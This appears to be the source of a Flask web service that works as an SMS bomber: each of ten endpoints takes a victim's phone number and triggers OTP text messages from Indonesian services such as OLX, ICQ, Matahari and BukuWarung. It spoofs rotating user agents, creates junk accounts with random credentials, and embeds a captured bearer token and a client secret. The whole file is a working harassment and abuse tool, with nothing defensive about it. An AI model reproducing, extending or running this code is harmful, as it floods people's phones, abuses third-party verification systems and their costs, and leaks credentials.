from flask import Flask,request, jsonify
from flask_cors import CORS
from flask_restful import Resource,Api
import requests, json, random, string

# author : polygon
# github : Bayu12345677

def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

app=Flask(__name__)
CORS(app)
api=Api(app)
class mapclub(Resource):
      def get(self):
          agent=["Mozilla/5.0 (Linux; Android 10; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.186 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_5 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B601 Safari/9537.53","Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Safari/537.36","okhttp/3.12.11"]
          ua=random.choice(agent)
          no=request.args.get("phone")
          if not no:
             return {"Message":"Parameters 'phone' wajib diisi!"}
          req=requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp",data=json.dumps({"account":no}),headers={"Host":"beryllium.mapclub.com","client-platform":"WEB","origin":"https://www.mapclub.com","authorization":"Bearer eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiIwOTRlMjcxMC1iNWFhLTRiN2YtOWI5MC0wYTBlYzk4OTYyOTIiLCJleHBpcmVkIjoxNjM4MTc0NzM2MzU0LCJleHBpcmUiOjM2MDAsImV4cCI6MTYzODE3NDczNiwiaWF0IjoxNjM4MTcxMTM2LCJwbGF0Zm9ybSI6IldFQiJ9.N8rwF-2O9dRvQ4YL_GDZalEwWKd3gDcY4OK9dfWRyXHKlQ_d1e7o3lVcleK-OSqn_HD0a-bifq1zztWTy1UEtQ","content-type":"application/json","accept-language":"en-US","accept":"application/json, text/plain, */*","user-agent":ua,"referer":"https://www.mapclub.com/member/register","accept-encoding":"gzip, deflate, br"}).json()
          if req["success"] == True:
             return jsonify({"result":"berhasil"})
          else:
             return jsonify({"result":"gagal"})

class jageward(Resource):
    def get(self):
        agent=["Mozilla/5.0 (Linux; Android 10; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.186 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_5 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B601 Safari/9537.53","Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Safari/537.36","okhttp/3.12.11"]
        ua = random.choice(agent)
        no = request.args.get("phone")
        if not no:
            return jsonify({"warning":"paramaters phone wajib di isi"})
        jag=requests.get("https://id.jagreward.com/member/register/",headers={"user-agent":ua}).cookies["PHPSESSID"]
        req=requests.get("https://id.jagreward.com/member/verify-mobile/"+no+"/",headers={"Host":"id.jagreward.com","Connection":"keep-alive","Accept":"*/*","X-Requested-With":"XMLHttpRequest","User-Agent":ua,"Referer":"https://id.jagreward.com/member/register/","Accept-Encoding":"gzip, deflate, br","Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","Cookke":"PHPSESSID="+jag}).text
        if "Anda telah meminta kode verifikasi melebihi batas yang diizinkan. Harap tunggu sebentar sebelum membuat permintaan kode verifikasi yang lain." in req:
            return jsonify({"result":"berhasil"})
        else:
            return jsonify({"result":"gagal"})

class matahari(Resource):
    def get(self):
        agent=["Mozilla/5.0 (Linux; Android 10; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.186 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_5 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B601 Safari/9537.53","Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Safari/537.36","okhttp/3.12.11"]
        ua=random.choice(agent)
        no=request.args.get("phone")
        if not no:
            return jsonify({"warning":"paramaters phone wajib di isi"})
        mth=requests.get("https://www.matahari.com/customer/account/create/",headers={"user-agent":ua}).cookies["PHPSESSID"]
        req=requests.post("https://www.matahari.com/rest/V1/thorCustomers",data=json.dumps({"thor_customer":{"name":id_generator(),"card_number":None,"email_address":id_generator()+"@gmail.com","mobile_country_code":"+62","gender_id":"1","mobile_number":"0"+no,"mro":"","password":id_generator()+"123","birth_date":"13/09/1999"}}),headers={"Host":"www.matahari.com","x-newrelic-id":"Vg4GVFVXDxAGVVlVBgcGVlY=","origin":"https://www.matahari.com","user-agent":ua,"content-type":"application/json","accept":"*/*","x-requested-with":"XMLHttpRequest","referer":"https://www.matahari.com/customer/account/create/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cookie":"PHPSESSID="+mth}).text
        if "Success" in req:
            return jsonify({"result":"berhasil"})
        else:
            return jsonify({"result":"gagal"})
class olx(Resource):
    def get(self):
        agent=["Mozilla/5.0 (Linux; Android 10; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.186 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_5 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B601 Safari/9537.53","Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Safari/537.36","okhttp/3.12.11"]
        ua=random.choice(agent)
        no=request.args.get("phone")
        if not no:
            return jsonify({"warning":"paramaters phone wajib di isi"})
        req=requests.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType":"phone","phone":"+62"+no,"language":"id"}),headers={"Host":"www.olx.co.id","x-newrelic-id":"VQMGU1ZVDxABU1lbBgMDUlI=","origin":"https://www.olx.co.id","x-panamera-fingerprint":"e01600dd8c6a82fa2dff1ec15164a252#1638175525174","user-agent":ua,"content-type":"application/json","accept":"*/*","referer":"https://www.olx.co.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}).text
        if "PENDING" in req:
            return jsonify({"resutl":"berhasil"})
        else:
            return jsonify({"result":"gagal"})
class icq(Resource):
      def get(self):
          agent=["Mozilla/5.0 (Linux; Android 10; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.186 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_5 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B601 Safari/9537.53","Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Safari/537.36","okhttp/3.12.11"]
          ua=random.choice(agent)
          no=request.args.get("phone")
          if not no:
            return jsonify({"warning":"paramater phone tidak boleh kosong"})
          req=requests.post("https://u.icq.net/api/v65/rapi/auth/sendCode",data=json.dumps({"reqId":"79651-1638179766","params":{"phone":"62"+no,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}}),headers={"Host":"u.icq.net","origin":"https://web.icq.com","user-agent":ua,"content-type":"application/json","accept":"*/*","referer":"https://web.icq.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}).json()
          if req["status"]["code"] == 20000:
            return jsonify({"result":"berhasil"})
          else:
            return jsonify({"result":"gagal"})
class myfave(Resource):
      def get(self):
          agent=["Mozilla/5.0 (Linux; Android 10; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.186 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_5 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B601 Safari/9537.53","Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Safari/537.36","okhttp/3.12.11"]
          ua=random.choice(agent)
          no=request.args.get("phone")
          if not no:
            return jsonify({"warning":"paramaters phone tidak boleh kosong"})
          req=requests.post("https://api.myfave.com/api/fave/v3/auth",data=json.dumps({"phone":"+62"+no}),headers={"Host":"api.myfave.com","Connection":"keep-alive","x-user-agent":"Fave-PWA/v1.0.0","Origin":"https://m.myfave.com","User-Agent":ua,"content-type":"application/json","Accept":"*/*","Referer":"https://m.myfave.com/jakarta/auth","Accept-Encoding":"gzip, deflate, br","Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}).text
          if "request_id" in req:
             return jsonify({"result":"berhasil"})
          else:
             return jsonify({"result":"gagal"})
class harves(Resource):
      def get(self):
          agent=["Mozilla/5.0 (Linux; Android 10; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.186 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_5 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B601 Safari/9537.53","Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Safari/537.36","okhttp/3.12.11"]
          ua=random.choice(agent)
          no=request.args.get("phone")
          if not no:
            return jsonify({"warning":"paramaters phone tidak boleh kosong"})
          req=requests.post("https://harvestcakes.com/register",data={"url":"","phone":"0"+no},headers={"user-agent":ua}).text
          if "Registration - OTP Validation | The Harvest" in req:
             return jsonify({"result":"berhasil"})
          else:
             return jsonify({"result":"gagal"})
class danacita(Resource):
      def get(self):
       	  agent=["Mozilla/5.0 (Linux; Android 10; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.186 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_5 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B601 Safari/9537.53","Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Safari/537.36","okhttp/3.12.11"]
          ua=random.choice(agent)
          no=request.args.get("phone")
          if not no:
            return jsonify({"warning":"paramaters phone tidak boleh kosong"})
          req=requests.post("https://api.danacita.co.id/v3/users/mobile_register/",data=json.dumps({"username":"+62"+no,"password":"Santuywae123@","accept_terms_and_policy":True}),headers={"Host":"api.danacita.co.id","accept":"application/json, text/plain, */*","origin":"https://app.danacita.co.id","user-agent":ua,"content-type":"application/json;charset=UTF-8","referer":"https://app.danacita.co.id/register/account","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}).text
          if "Successfully sent OTP SMS" in req:
             return jsonify({"result":"berhasil"})
          else:
             return jsonify({"result":"gagal"})

class bukuwarung(Resource):
      def get(self):
          agent=["Mozilla/5.0 (Linux; Android 10; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.186 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_5 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B601 Safari/9537.53","Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Safari/537.36","okhttp/3.12.11"]
          ua=random.choice(agent)
          no=request.args.get("phone")
          if not no:
            return jsonify({"warning":"paramaters phone tidak boleh kosong"})
          req=requests.post("https://api-v2.bukuwarung.com/api/v2/auth/otp/send",data=json.dumps({"action":"LOGIN_OTP","clientId":"2e3570c6-317e-4524-b284-980e5a4335b6","clientSecret":"S81VsdrwNUN23YARAL54MFjB2JSV2TLn","countryCode":"62","deviceId":"baeab7ac-86d2-4c2a-ac1c-6392876c2930R","method":"SMS","phone":no}),headers={"Host":"api-v2.bukuwarung.com","accept":"application/json","x-app-version-name":"3.22.0","x-app-version-code":"4217","x-timezone":"Asia/Jakarta","authorization":"Bearer null","content-type":"application/json; charset=UTF-8","accept-encoding":"gzip","user-agent":ua}).text
          if "OTP_SENT" in req:
                return jsonify({"result":"berhasil"})
          else:
                return jsonify({"result":"gagal"})
class payfaz(Resource):
      def get(self):
          agent=["Mozilla/5.0 (Linux; Android 10; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.186 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_5 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B601 Safari/9537.53","Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Safari/537.36","okhttp/3.12.11"]
          ua=random.choice(agent)
          no=request.args.get("phone")
          if not no:
            return jsonify({"warning":"paramaters tidak boleh kosong"})
          req=requests.post("https://payfazz.prod.fazz.id/agent/api/v1/phoneVerifications",data={"phone":"0"+no,"type":"register"},headers={"Host":"payfazz.prod.fazz.id","user-agent":ua,"advertisingid":"","content-type":"application/x-www-form-urlencoded"}).text
          if "phoneVerificationId" in req:
             return jsonify({"result":"berhasil"})
          else:
             return jsonify({"result":"gagal"})

@app.route("/", methods=['GET'])
def home():
    return "online"

api.add_resource(mapclub,"/api/mapclub")
api.add_resource(bukuwarung, "/api/bukuwarung")
api.add_resource(jageward, "/api/jageward")
api.add_resource(matahari, "/api/matahari")
api.add_resource(olx, "/api/olx")
api.add_resource(icq, "/api/icq")
api.add_resource(myfave, "/api/myfave")
api.add_resource(harves, "/api/harves")
api.add_resource(danacita, "/api/danacita")
api.add_resource(payfaz, "/api/payfaz")

app.run(debug=True, port=8000)
